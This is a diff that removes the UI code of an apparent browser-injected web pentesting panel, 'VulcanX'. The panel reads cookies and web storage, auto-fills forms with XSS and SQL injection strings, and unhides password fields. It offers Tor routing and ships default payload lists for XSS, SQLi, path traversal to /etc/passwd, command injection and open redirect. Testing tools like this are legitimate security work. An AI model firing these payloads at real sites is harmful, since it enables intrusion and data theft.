-            } else if (tab === 'storage') {
-                container.innerHTML = '';
-                
-                var refBtn = document.createElement('button');
-                refBtn.innerText = 'Refresh Storage';
-                refBtn.style.width = '100%';
-                refBtn.style.padding = '8px';
-                refBtn.style.background = '#222';
-                refBtn.style.color = '#fff';
-                refBtn.style.border = '1px solid #444';
-                refBtn.style.borderRadius = '4px';
-                refBtn.style.cursor = 'pointer';
-                refBtn.style.fontWeight = 'bold';
-                refBtn.style.marginBottom = '12px';
-                refBtn.onclick = function() { window.__vulcanx_render(); };
-                container.appendChild(refBtn);
-
-                var items = [];
-                
-                // Cookies
-                if (document.cookie) {
-                    document.cookie.split(';').forEach(c => {
-                        var parts = c.split('=');
-                        items.push({
-                            source: 'Cookie',
-                            key: parts[0] ? parts[0].trim() : '',
-                            value: parts.slice(1).join('=')
-                        });
-                    });
-                }
-                
-                // LocalStorage
-                for (var i = 0; i < localStorage.length; i++) {
-                    var k = localStorage.key(i);
-                    items.push({
-                        source: 'Local',
-                        key: k,
-                        value: localStorage.getItem(k)
-                    });
-                }
-
-                // SessionStorage
-                for (var i = 0; i < sessionStorage.length; i++) {
-                    var k = sessionStorage.key(i);
-                    items.push({
-                        source: 'Session',
-                        key: k,
-                        value: sessionStorage.getItem(k)
-                    });
-                }
-                
-                if (items.length === 0) {
-                    var noStorage = document.createElement('div');
-                    noStorage.style.color = '#666';
-                    noStorage.style.textAlign = 'center';
-                    noStorage.style.marginTop = '20px';
-                    noStorage.innerText = 'No storage items found.';
-                    container.appendChild(noStorage);
-                } else {
-                    var table = document.createElement('table');
-                    table.className = 'vx-table';
-                    table.innerHTML = `<thead>
-                                        <tr>
-                                            <th style="width:60px;">Source</th>
-                                            <th style="width:120px;">Key</th>
-                                            <th>Value</th>
-                                        </tr>
-                                       </thead><tbody></tbody>`;
-                    var tbody = table.querySelector('tbody');
-                    items.forEach(function(item) {
-                        var tr = document.createElement('tr');
-                        tr.innerHTML = `<td><span class="vx-badge" style="background:#333;">${item.source}</span></td>
-                                        <td style="font-weight:bold;color:#ccc;">${item.key}</td>
-                                        <td style="color:#aaa;">${item.value}</td>`;
-                        tbody.appendChild(tr);
-                    });
-                    container.appendChild(table);
-                }
-
-            } else if (tab === 'map') {
-                container.innerHTML = '';
-                
-                var scanBtn = document.createElement('button');
-                scanBtn.innerText = 'Scan LinkMap';
-                scanBtn.style.width = '100%';
-                scanBtn.style.padding = '8px';
-                scanBtn.style.background = '#800000';
-                scanBtn.style.color = '#fff';
-                scanBtn.style.border = '1px solid #ff0055';
-                scanBtn.style.borderRadius = '4px';
-                scanBtn.style.cursor = 'pointer';
-                scanBtn.style.fontWeight = 'bold';
-                scanBtn.style.marginBottom = '12px';
-                
-                var statusDiv = document.createElement('div');
-                statusDiv.style.marginBottom = '12px';
-                statusDiv.style.fontSize = '10px';
-                statusDiv.style.color = '#aaa';
-                statusDiv.innerText = "Status: Ready";
-                
-                var linksList = document.createElement('ul');
-                linksList.style.listStyleType = 'none';
-                linksList.style.padding = '0';
-                linksList.style.margin = '0';
-                
-                var links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
-                var internalLinks = links.filter(href => href.startsWith(window.location.origin) && !href.includes('#'));
-                var uniqueLinks = [...new Set(internalLinks)];
-                
-                scanBtn.onclick = async function() {
-                    if (uniqueLinks.length === 0) {
-                        alert("No internal links found to scan.");
-                        return;
-                    }
-                    scanBtn.disabled = true;
-                        scanBtn.style.opacity = '0.5';
-                        statusDiv.innerText = `Scanning: 0 / ${uniqueLinks.length}`;
-                        
-                        let completed = 0;
-                        for (let i = 0; i < uniqueLinks.length; i++) {
-                            let link = uniqueLinks[i];
-                            let li = linksList.children[i];
-                            try {
-                                li.style.color = '#ffcc00'; // in progress
-                                
-                                // Open link in a new background tab
-                                var newWin = window.open(link, '_blank');
-                                
-                                // Wait for it to load, then close it
-                                await new Promise(r => setTimeout(r, 2500)); 
-                                if (newWin && !newWin.closed) {
-                                    newWin.close();
-                                }
-                                
-                                li.style.color = '#00ff55'; // done
-                            } catch(e) {
-                                li.style.color = '#ff0055'; // error
-                            }
-                            completed++;
-                            statusDiv.innerText = `Scanning: ${completed} / ${uniqueLinks.length}`;
-                        }
-                        
-                        statusDiv.innerText = 'Scan Complete! Check Traffic and Findings tabs.';
-                        setTimeout(() => {
-                            scanBtn.disabled = false;
-                            scanBtn.style.opacity = '1';
-                        }, 2000);
-                };
-                
-                container.appendChild(scanBtn);
-                container.appendChild(statusDiv);
-                
-                uniqueLinks.forEach(link => {
-                    var li = document.createElement('li');
-                    li.style.padding = '4px 0';
-                    li.style.borderBottom = '1px solid #333';
-                    li.style.fontSize = '10px';
-                    li.style.wordBreak = 'break-all';
-                    li.style.color = '#aaa';
-                    li.innerText = link.replace(window.location.origin, '');
-                    linksList.appendChild(li);
-                });
-                
-                if (uniqueLinks.length === 0) {
-                    var emptyDiv = document.createElement('div');
-                    emptyDiv.innerText = 'No internal links found on this page.';
-                    emptyDiv.style.color = '#666';
-                    emptyDiv.style.textAlign = 'center';
-                    emptyDiv.style.marginTop = '20px';
-                    container.appendChild(emptyDiv);
-                } else {
-                    container.appendChild(linksList);
-                }
-
-
-                if (items.length === 0) {
-                    var emptyDiv = document.createElement('div');
-                    emptyDiv.style.color = '#666';
-                    emptyDiv.style.textAlign = 'center';
-                    emptyDiv.style.marginTop = '20px';
-                    emptyDiv.innerText = 'No cookies or storage keys found.';
-                    container.appendChild(emptyDiv);
-                    return;
-                }
-
-                var fillAllXSS = document.createElement('button');
-                fillAllXSS.innerText = 'Fill All XSS';
-                fillAllXSS.style.width = '30%';
-                fillAllXSS.style.padding = '8px';
-                fillAllXSS.style.background = '#440055';
-                fillAllXSS.style.color = '#fff';
-                fillAllXSS.style.border = '1px solid #ff00ff';
-                fillAllXSS.style.borderRadius = '4px';
-                fillAllXSS.style.cursor = 'pointer';
-                fillAllXSS.style.fontWeight = 'bold';
-                fillAllXSS.style.marginBottom = '12px';
-                fillAllXSS.style.marginRight = '2%';
-                fillAllXSS.onclick = function() {
-                    inputs.forEach(input => {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, '\"><script>alert(document.domain)</script>'); } else { input.value = '\"><script>alert(document.domain)</script>'; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.style.border = '2px solid #ff00ff';
-                    });
-                };
-                container.appendChild(fillAllXSS);
-                
-                var fillAllSQLi = document.createElement('button');
-                fillAllSQLi.innerText = 'Fill All SQLi';
-                fillAllSQLi.style.width = '30%';
-                fillAllSQLi.style.padding = '8px';
-                fillAllSQLi.style.background = '#331100';
-                fillAllSQLi.style.color = '#fff';
-                fillAllSQLi.style.border = '1px solid #ff5500';
-                fillAllSQLi.style.borderRadius = '4px';
-                fillAllSQLi.style.cursor = 'pointer';
-                fillAllSQLi.style.fontWeight = 'bold';
-                fillAllSQLi.style.marginBottom = '12px';
-                fillAllSQLi.style.marginRight = '2%';
-                fillAllSQLi.onclick = function() {
-                    inputs.forEach(input => {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.style.border = '2px solid #ff5500';
-                    });
-                };
-                container.appendChild(fillAllSQLi);
-                
-                var tamperDOM = document.createElement('button');
-                tamperDOM.innerText = 'Tamper DOM (Reveal All)';
-                tamperDOM.style.width = '100%';
-                tamperDOM.style.padding = '8px';
-                tamperDOM.style.background = '#004400';
-                tamperDOM.style.color = '#00ff55';
-                tamperDOM.style.border = '1px solid #00ff55';
-                tamperDOM.style.borderRadius = '4px';
-                tamperDOM.style.cursor = 'pointer';
-                tamperDOM.style.fontWeight = 'bold';
-                tamperDOM.style.marginBottom = '12px';
-                tamperDOM.onclick = function() {
-                    // Reveal hidden inputs, convert passwords to text, remove maxlengths and disabled attributes
-                    var modifiedCount = 0;
-                    document.querySelectorAll('input, select, textarea, button').forEach(el => {
-                        if (el.type === 'hidden') {
-                            el.type = 'text';
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.type === 'password') {
-                            el.type = 'text';
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.hasAttribute('disabled')) {
-                            el.removeAttribute('disabled');
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.hasAttribute('readonly')) {
-                            el.removeAttribute('readonly');
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                        if (el.hasAttribute('maxlength')) {
-                            el.removeAttribute('maxlength');
-                            el.style.border = '2px solid #00ff55';
-                            modifiedCount++;
-                        }
-                    });
-                    if (modifiedCount > 0) {
-                        alert("DOM Tampering Active! " + modifiedCount + " elements modified (revealed hidden fields, removed disabled/readonly/maxlength attributes).");
-                    } else {
-                        alert("No restricted DOM elements found to tamper with.");
-                    }
-                };
-                container.appendChild(tamperDOM);
-
-                var clearAll = document.createElement('button');
-                clearAll.innerText = 'Clear Forms';
-                clearAll.style.width = '30%';
-                clearAll.style.padding = '8px';
-                clearAll.style.background = '#222';
-                clearAll.style.color = '#fff';
-                clearAll.style.border = '1px solid #444';
-                clearAll.style.borderRadius = '4px';
-                clearAll.style.cursor = 'pointer';
-                clearAll.style.fontWeight = 'bold';
-                clearAll.style.marginBottom = '12px';
-                clearAll.onclick = function() {
-                    inputs.forEach(input => {
-                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
-                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
-                        if (setter) { setter.call(input, ""); } else { input.value = ""; }
-                        input.dispatchEvent(new Event('input', { bubbles: true }));
-                        input.dispatchEvent(new Event('change', { bubbles: true }));
-                        input.style.border = '';
-                    });
-                };
-                container.appendChild(clearAll);
-
-
-                var table = document.createElement('table');
-                table.className = 'vx-table';
-                table.innerHTML = `<thead>
-                                    <tr>
-                                        <th>Source</th>
-                                        <th>Key</th>
-                                        <th>Value</th>
-                                    </tr>
-                                   </thead>`;
-                var tbody = document.createElement('tbody');
-                
-                var sensitiveKeys = /token|session|secret|jwt|password|key|admin|auth|role/i;
-                items.forEach(item => {
-                    var tr = document.createElement('tr');
-                    var isSensitive = sensitiveKeys.test(item.key) || sensitiveKeys.test(item.value);
-                    if (isSensitive) {
-                        tr.style.background = 'rgba(255, 0, 85, 0.15)';
-                    }
-                    tr.innerHTML = `<td style="color:#00ff55;font-weight:bold;">${item.source}</td>
-                                    <td style="color:#ffcc00;font-weight:bold;">${item.key}</td>
-                                    <td style="color:#aaa;word-break:break-all;">${item.value}</td>`;
-                    tbody.appendChild(tr);
-                });
-                table.appendChild(tbody);
-                container.appendChild(table);
-            } else if (tab === 'vpn') {
-                container.innerHTML = '';
-                
-                var title = document.createElement('h3');
-                title.innerText = 'Tor Proxy Manager';
-                title.style.color = '#ffcc00';
-                title.style.borderBottom = '1px solid #333';
-                title.style.paddingBottom = '8px';
-                container.appendChild(title);
-                
-                var info = document.createElement('div');
-                info.style.color = '#aaa';
-                info.style.marginBottom = '15px';
-                info.style.fontSize = '11px';
-                info.innerText = 'Route all browser traffic through local Tor proxy to bypass blocks.';
-                container.appendChild(info);
-                
-                var resultDiv = document.createElement('div');
-                resultDiv.style.background = '#111';
-                resultDiv.style.border = '1px solid #333';
-                resultDiv.style.padding = '10px';
-                resultDiv.style.fontFamily = 'monospace';
-                resultDiv.style.whiteSpace = 'pre-wrap';
-                resultDiv.style.display = 'none';
-                
-                resultDiv.style.display = 'block';
-                resultDiv.style.marginTop = '10px';
-                
-                var torBtn = document.createElement('button');
-                torBtn.innerText = 'Enable Tor Proxy (SOCKS5 127.0.0.1:9050)';
-                torBtn.style.padding = '8px';
-                torBtn.style.background = '#4CAF50';
-                torBtn.style.color = '#fff';
-                torBtn.style.border = 'none';
-                torBtn.style.cursor = 'pointer';
-                torBtn.style.borderRadius = '4px';
-                torBtn.onclick = function() {
-                    resultDiv.innerText = 'Routing traffic through Tor...';
-                    fetch('/api/vpn', {
-                        method: 'POST',
-                        body: JSON.stringify({action: 'enable_tor'}),
-                        headers: {'Content-Type': 'application/json'}
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        if(data.status === 'ok') {
-                            resultDiv.innerText = `Success!\n\nTor proxy enabled.`;
-                        } else {
-                            resultDiv.innerText = 'Error: ' + data.error;
-                        }
-                    }).catch(e => resultDiv.innerText = 'Error: ' + e);
-                };
-                
-                var checkIpBtn = document.createElement('button');
-                checkIpBtn.innerText = 'Check Current IP';
-                checkIpBtn.style.padding = '8px';
-                checkIpBtn.style.background = '#2196F3';
-                checkIpBtn.style.color = '#fff';
-                checkIpBtn.style.border = 'none';
-                checkIpBtn.style.cursor = 'pointer';
-                checkIpBtn.style.borderRadius = '4px';
-                checkIpBtn.style.marginLeft = '10px';
-                checkIpBtn.onclick = function() {
-                    resultDiv.innerText = 'Checking IP address...';
-                    fetch('/api/vpn', {
-                        method: 'POST',
-                        body: JSON.stringify({action: 'check_ip'}),
-                        headers: {'Content-Type': 'application/json'}
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        if(data.status === 'ok') {
-                            resultDiv.innerText = `Current IP: ${data.ip}`;
-                        } else {
-                            resultDiv.innerText = 'Error: ' + data.error;
-                        }
-                    }).catch(e => resultDiv.innerText = 'Error: ' + e);
-                };
-                
-                var disableTorBtn = document.createElement('button');
-                disableTorBtn.innerText = 'Disable Tor Proxy';
-                disableTorBtn.style.padding = '8px';
-                disableTorBtn.style.marginTop = '10px';
-                disableTorBtn.style.background = '#f44336';
-                disableTorBtn.style.color = '#fff';
-                disableTorBtn.style.border = 'none';
-                disableTorBtn.style.cursor = 'pointer';
-                disableTorBtn.style.borderRadius = '4px';
-                disableTorBtn.style.marginLeft = '10px';
-                disableTorBtn.onclick = function() {
-                    resultDiv.innerText = 'Disabling Tor proxy...';
-                    fetch('/api/vpn', {
-                        method: 'POST',
-                        body: JSON.stringify({action: 'disable_tor'}),
-                        headers: {'Content-Type': 'application/json'}
-                    })
-                    .then(r => r.json())
-                    .then(data => {
-                        if(data.status === 'ok') {
-                            resultDiv.innerText = `Success!\n\nTor proxy disabled.`;
-                        } else {
-                            resultDiv.innerText = 'Error: ' + data.error;
-                        }
-                    }).catch(e => resultDiv.innerText = 'Error: ' + e);
-                };
-                
-                container.appendChild(torBtn);
-                container.appendChild(disableTorBtn);
-                container.appendChild(checkIpBtn);
-                container.appendChild(resultDiv);
-
-            } else if (tab === 'payloads') {
-                container.innerHTML = '';
-                
-                var pLabel = document.createElement('div');
-                pLabel.innerText = 'Manage Fuzzer & Forms Payloads';
-                pLabel.style.fontWeight = 'bold';
-                pLabel.style.marginBottom = '10px';
-                pLabel.style.color = '#ff0055';
-                pLabel.style.textAlign = 'center';
-                container.appendChild(pLabel);
-
-                var catSelect = document.createElement('select');
-                catSelect.style.width = '100%';
-                catSelect.style.padding = '8px';
-                catSelect.style.background = '#222';
-                catSelect.style.color = '#fff';
-                catSelect.style.border = '1px solid #444';
-                catSelect.style.marginBottom = '10px';
-                catSelect.style.borderRadius = '4px';
-                
-                var cats = Object.keys(window.__vulcanx_state.payloads || {});
-                cats.forEach(function(cat) {
-                    var opt = document.createElement('option');
-                    opt.value = cat;
-                    opt.innerText = cat.toUpperCase() + ' Payloads';
-                    catSelect.appendChild(opt);
-                });
-                container.appendChild(catSelect);
-
-                var pArea = document.createElement('textarea');
-                pArea.style.width = '100%';
-                pArea.style.height = '220px';
-                pArea.style.background = '#111';
-                pArea.style.color = '#00ff55';
-                pArea.style.border = '1px solid #333';
-                pArea.style.fontFamily = 'monospace';
-                pArea.style.fontSize = '11px';
-                pArea.style.padding = '8px';
-                pArea.style.marginBottom = '10px';
-                pArea.style.borderRadius = '4px';
-                pArea.style.whiteSpace = 'pre';
-                container.appendChild(pArea);
-
-                var updateArea = function() {
-                    var cat = catSelect.value;
-                    if (window.__vulcanx_state.payloads[cat]) {
-                        pArea.value = window.__vulcanx_state.payloads[cat].join('\n');
-                    }
-                };
-                catSelect.onchange = updateArea;
-                updateArea();
-
-                var pBtnGroup = document.createElement('div');
-                pBtnGroup.style.display = 'flex';
-                pBtnGroup.style.gap = '10px';
-
-                var saveBtn = document.createElement('button');
-                saveBtn.innerText = 'Save Changes';
-                saveBtn.style.flex = '1';
-                saveBtn.style.padding = '10px';
-                saveBtn.style.background = '#006644';
-                saveBtn.style.color = '#fff';
-                saveBtn.style.border = 'none';
-                saveBtn.style.borderRadius = '4px';
-                saveBtn.style.cursor = 'pointer';
-                saveBtn.style.fontWeight = 'bold';
-                saveBtn.onclick = function() {
-                    var cat = catSelect.value;
-                    var lines = pArea.value.split('\n').map(function(l) { return l.trim(); }).filter(function(l) { return l.length > 0; });
-                    window.__vulcanx_state.payloads[cat] = lines;
-                    var tst = document.createElement('div');
-                    tst.className = 'vx-toast';
-                    tst.style.position = 'fixed';
-                    tst.style.bottom = '20px';
-                    tst.style.right = '20px';
-                    tst.style.background = 'rgba(0,102,68,0.9)';
-                    tst.style.color = '#fff';
-                    tst.style.padding = '10px 16px';
-                    tst.style.borderRadius = '6px';
-                    tst.style.zIndex = '999999';
-                    tst.style.fontSize = '12px';
-                    tst.innerText = cat.toUpperCase() + ' Payloads Saved! (' + lines.length + ' payloads)';
-                    document.body.appendChild(tst);
-                    setTimeout(function() { tst.style.opacity = '0'; setTimeout(function() { tst.remove(); }, 500); }, 3000);
-                };
-                pBtnGroup.appendChild(saveBtn);
-
-                var resetBtn = document.createElement('button');
-                resetBtn.innerText = 'Reset to Default';
-                resetBtn.style.flex = '1';
-                resetBtn.style.padding = '10px';
-                resetBtn.style.background = '#440000';
-                resetBtn.style.color = '#fff';
-                resetBtn.style.border = 'none';
-                resetBtn.style.borderRadius = '4px';
-                resetBtn.style.cursor = 'pointer';
-                resetBtn.style.fontWeight = 'bold';
-                resetBtn.onclick = function() {
-                    var defaults = {
-                        xss: ['<script>alert(1)</script>', '"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>", '<svg onload=alert(1)>', 'javascript:alert(1)', '<img src=x onerror=alert(document.cookie)>', '{{7*7}}', '${7*7}'],
-                        sqli: ["'", '"', "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null--", "admin'--", "1; DROP TABLE users--", "1' AND SLEEP(5)--"],
-                        lfi: ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '....//....//etc/passwd', '%2e%2e%2fetc%2fpasswd'],
-                        cmd: ['; id', '| id', '&& id', '`id`', '$(id)', '; cat /etc/passwd', '| whoami'],
-                        open_redirect: ['//evil.com', 'https://evil.com', '//google.com/%2F..', 'javascript:alert(1)']
-                    };
-                    var cat = catSelect.value;
-                    if (defaults[cat]) {
-                        window.__vulcanx_state.payloads[cat] = defaults[cat];
-                        pArea.value = defaults[cat].join('\n');
-                    }
-                };
-                pBtnGroup.appendChild(resetBtn);
-                container.appendChild(pBtnGroup);
-
-            } else if (tab === 'dom') {
-                container.innerHTML = '';
-
-                var domTitle = document.createElement('div');
-                domTitle.innerText = 'DOM Sink Monitor';
-                domTitle.style.fontWeight = 'bold';
-                domTitle.style.marginBottom = '10px';
-                domTitle.style.color = '#ff0055';
-                domTitle.style.textAlign = 'center';
-                container.appendChild(domTitle);
-
-                var domSinks = window.__vulcanx_state.domSinks || [];
-                if (domSinks.length === 0) {
-                    var noSinks = document.createElement('div');
-                    noSinks.innerText = 'No DOM sinks triggered yet. Browse the app to collect data.';
-                    noSinks.style.color = '#666';
-                    noSinks.style.fontSize = '11px';
-                    noSinks.style.textAlign = 'center';
-                    noSinks.style.marginTop = '20px';
-                    container.appendChild(noSinks);
-                } else {
-                    domSinks.forEach(function(sink) {
-                        var sinkDiv = document.createElement('div');
-                        sinkDiv.style.marginBottom = '8px';
-                        sinkDiv.style.padding = '8px';
-                        sinkDiv.style.background = '#1a0a0a';
-                        sinkDiv.style.border = '1px solid #660000';
-                        sinkDiv.style.borderRadius = '4px';
-                        sinkDiv.style.fontFamily = 'monospace';
-                        sinkDiv.style.fontSize = '10px';
-                        sinkDiv.style.color = '#ff6666';
-                        sinkDiv.style.wordBreak = 'break-all';
-                        sinkDiv.innerText = '[' + (sink.sink||'unknown') + '] ' + (sink.value||'').slice(0, 200);
-                        container.appendChild(sinkDiv);
-                    });
-                }
-
-                var clearDomBtn = document.createElement('button');
-                clearDomBtn.innerText = 'Clear';
-                clearDomBtn.style.marginTop = '10px';
-                clearDomBtn.style.width = '100%';
-                clearDomBtn.style.padding = '8px';
-                clearDomBtn.style.background = '#440000';
-                clearDomBtn.style.color = '#fff';
-                clearDomBtn.style.border = 'none';
-                clearDomBtn.style.cursor = 'pointer';
-                clearDomBtn.style.borderRadius = '4px';
-                clearDomBtn.onclick = function() {
-                    window.__vulcanx_state.domSinks = [];
-                    window.__vulcanx_render();
-                };
-                container.appendChild(clearDomBtn);
-
-            } else if (tab === 'scope') {
-                container.innerHTML = '';
-
-                var scopeTitle = document.createElement('div');
-                scopeTitle.innerText = 'Scope Manager';
-                scopeTitle.style.fontWeight = 'bold';
-                scopeTitle.style.marginBottom = '10px';
-                scopeTitle.style.color = '#ffcc00';
-                scopeTitle.style.textAlign = 'center';
-                container.appendChild(scopeTitle);
-
-                var scopeInfo = document.createElement('div');
-                scopeInfo.innerText = 'Add hostnames or URL patterns to restrict scanning scope. One entry per line.';
-                scopeInfo.style.color = '#888';
-                scopeInfo.style.fontSize = '10px';
-                scopeInfo.style.marginBottom = '10px';
-                container.appendChild(scopeInfo);
-
-                var scopeArea = document.createElement('textarea');
-                scopeArea.style.width = '100%';
-                scopeArea.style.height = '200px';
-                scopeArea.style.background = '#111';
-                scopeArea.style.color = '#ffcc00';
-                scopeArea.style.border = '1px solid #333';
-                scopeArea.style.fontFamily = 'monospace';
-                scopeArea.style.fontSize = '11px';
-                scopeArea.style.padding = '8px';
-                scopeArea.style.borderRadius = '4px';
-                scopeArea.placeholder = 'example.com\napi.example.com\n*.example.com';
-                scopeArea.value = (window.__vulcanx_state.scope || []).join('\n');
-                container.appendChild(scopeArea);
-
-                var scopeSaveBtn = document.createElement('button');
-                scopeSaveBtn.innerText = 'Save Scope';
-                scopeSaveBtn.style.marginTop = '10px';
-                scopeSaveBtn.style.width = '100%';
-                scopeSaveBtn.style.padding = '10px';
-                scopeSaveBtn.style.background = '#004488';
-                scopeSaveBtn.style.color = '#fff';
-                scopeSaveBtn.style.border = 'none';
-                scopeSaveBtn.style.cursor = 'pointer';
-                scopeSaveBtn.style.borderRadius = '4px';
-                scopeSaveBtn.style.fontWeight = 'bold';
-                scopeSaveBtn.onclick = function() {
-                    var lines = scopeArea.value.split('\n').map(function(l) { return l.trim(); }).filter(function(l) { return l.length > 0; });
-                    window.__vulcanx_state.scope = lines;
-                    var tst = document.createElement('div');
-                    tst.style.position = 'fixed';
-                    tst.style.bottom = '20px';
-                    tst.style.right = '20px';
-                    tst.style.background = 'rgba(0,68,136,0.9)';
-                    tst.style.color = '#fff';
-                    tst.style.padding = '10px 16px';
-                    tst.style.borderRadius = '6px';
-                    tst.style.zIndex = '999999';
-                    tst.style.fontSize = '12px';
-                    tst.innerText = 'Scope saved! (' + lines.length + ' entries)';
-                    document.body.appendChild(tst);
-                    setTimeout(function() { tst.style.opacity = '0'; setTimeout(function() { tst.remove(); }, 500); }, 3000);
-                };
-                container.appendChild(scopeSaveBtn);
-
-            } else if (tab === 'report') {
-                container.innerHTML = '';
-
-                var rptTitle = document.createElement('div');
-                rptTitle.innerText = 'Engagement Report';
-                rptTitle.style.fontWeight = 'bold';
-                rptTitle.style.marginBottom = '10px';
-                rptTitle.style.color = '#aa00ff';
-                rptTitle.style.textAlign = 'center';
-                container.appendChild(rptTitle);
-
-                var findings = window.__vulcanx_state.findings || [];
-                var counts = {CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, INFO:0};
-                findings.forEach(function(f) { var sev = (f.severity||'INFO').toUpperCase(); if (counts[sev] !== undefined) counts[sev]++; });
-
-                var statsDiv = document.createElement('div');
-                statsDiv.style.display = 'flex';
-                statsDiv.style.gap = '6px';
-                statsDiv.style.marginBottom = '12px';
-                statsDiv.style.flexWrap = 'wrap';
-                var sevColors = {CRITICAL:'#ff0055', HIGH:'#ff6600', MEDIUM:'#ffcc00', LOW:'#00aaff', INFO:'#888'};
-                Object.keys(counts).forEach(function(sev) {
-                    var pill = document.createElement('div');
-                    pill.style.flex = '1';
-                    pill.style.textAlign = 'center';
-                    pill.style.padding = '6px 4px';
-                    pill.style.background = '#1a1a24';
-                    pill.style.border = '1px solid ' + (sevColors[sev]||'#333');
-                    pill.style.borderRadius = '4px';
-                    pill.style.fontSize = '10px';
-                    pill.style.color = sevColors[sev]||'#888';
-                    pill.innerHTML = '<strong>' + counts[sev] + '</strong><br>' + sev;
-                    statsDiv.appendChild(pill);
-                });
-                container.appendChild(statsDiv);
-
-                var sortedFindings = findings.slice().sort(function(a,b) {
-                    var order = {CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFO:4};
-                    return (order[(a.severity||'INFO').toUpperCase()]||4) - (order[(b.severity||'INFO').toUpperCase()]||4);
-                });
-                var top5 = sortedFindings.slice(0, 5);
-                if (top5.length === 0) {
-                    var noFindingsDiv = document.createElement('div');
-                    noFindingsDiv.innerText = 'No findings yet.';
-                    noFindingsDiv.style.color = '#666';
-                    noFindingsDiv.style.fontSize = '11px';
-                    container.appendChild(noFindingsDiv);
-                } else {
-                    top5.forEach(function(f) {
-                        var fItem = document.createElement('div');
-                        fItem.style.marginBottom = '6px';
-                        fItem.style.padding = '6px';
-                        fItem.style.background = '#1a1a24';
-                        fItem.style.borderLeft = '2px solid ' + (sevColors[(f.severity||'INFO').toUpperCase()] || '#888');
-                        fItem.style.borderRadius = '0 4px 4px 0';
-                        fItem.innerHTML = '<div style="font-weight:bold;color:' + (sevColors[(f.severity||'INFO').toUpperCase()]||'#888') + ';font-size:10px;">' + (f.severity||'INFO') + ' – ' + (f.type||'') + '</div><div style="color:#aaa;font-size:9px;word-break:break-all;">' + (f.url||'').slice(0,100) + '</div>';
-                        container.appendChild(fItem);
-                    });
-                }
-
-                var rptBtnRow = document.createElement('div');
-                rptBtnRow.style.display = 'flex';
-                rptBtnRow.style.gap = '6px';
-                rptBtnRow.style.marginTop = '12px';
-                rptBtnRow.style.flexWrap = 'wrap';
-
-                var dlHtmlBtn = document.createElement('button');
-                dlHtmlBtn.innerText = '\u2b07 HTML Report';
-                dlHtmlBtn.style.flex = '1';
-                dlHtmlBtn.style.background = '#004488';
-                dlHtmlBtn.style.color = '#fff';
-                dlHtmlBtn.style.border = '1px solid #0088ff';
-                dlHtmlBtn.style.padding = '6px';
-                dlHtmlBtn.style.borderRadius = '3px';
-                dlHtmlBtn.style.cursor = 'pointer';
-                dlHtmlBtn.style.fontSize = '10px';
-                dlHtmlBtn.onclick = async function() {
-                    try {
-                        var resp = await fetch('/api/report');
-                        if (resp.ok) {
-                            var html = await resp.text();
-                            var blob = new Blob([html], {type:'text/html'});
-                            var a = document.createElement('a');
-                            a.href = URL.createObjectURL(blob);
-                            a.download = 'vulcanx_report.html';
-                            a.click();
-                        } else {
-                            alert('Could not fetch /api/report');
-                        }
-                    } catch(e) {
-                        alert('Error fetching report: ' + e.message);
-                    }
-                };
-                rptBtnRow.appendChild(dlHtmlBtn);
-
-                var dlJsonBtn = document.createElement('button');
-                dlJsonBtn.innerText = '\u2b07 JSON';
-                dlJsonBtn.style.flex = '1';
-                dlJsonBtn.style.background = '#333';
-                dlJsonBtn.style.color = '#fff';
-                dlJsonBtn.style.border = '1px solid #555';
-                dlJsonBtn.style.padding = '6px';
-                dlJsonBtn.style.borderRadius = '3px';
-                dlJsonBtn.style.cursor = 'pointer';
-                dlJsonBtn.style.fontSize = '10px';
-                dlJsonBtn.onclick = function() {
-                    var data = {
-                        findings: window.__vulcanx_state.findings,
-                        traffic: window.__vulcanx_state.traffic,
-                        domSinks: window.__vulcanx_state.domSinks,
-                        scope: window.__vulcanx_state.scope,
-                        generatedAt: new Date().toISOString()
-                    };
-                    var blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
-                    var a = document.createElement('a');
-                    a.href = URL.createObjectURL(blob);
-                    a.download = 'vulcanx_report.json';
-                    a.click();
-                };
-                rptBtnRow.appendChild(dlJsonBtn);
-
-                var copySummaryBtn = document.createElement('button');
-                copySummaryBtn.innerText = '\uD83D\uDCCB Copy Summary';
-                copySummaryBtn.style.flex = '1';
-                copySummaryBtn.style.background = '#440055';
-                copySummaryBtn.style.color = '#fff';
-                copySummaryBtn.style.border = '1px solid #aa00ff';
-                copySummaryBtn.style.padding = '6px';
-                copySummaryBtn.style.borderRadius = '3px';
-                copySummaryBtn.style.cursor = 'pointer';
-                copySummaryBtn.style.fontSize = '10px';
-                copySummaryBtn.onclick = function() {
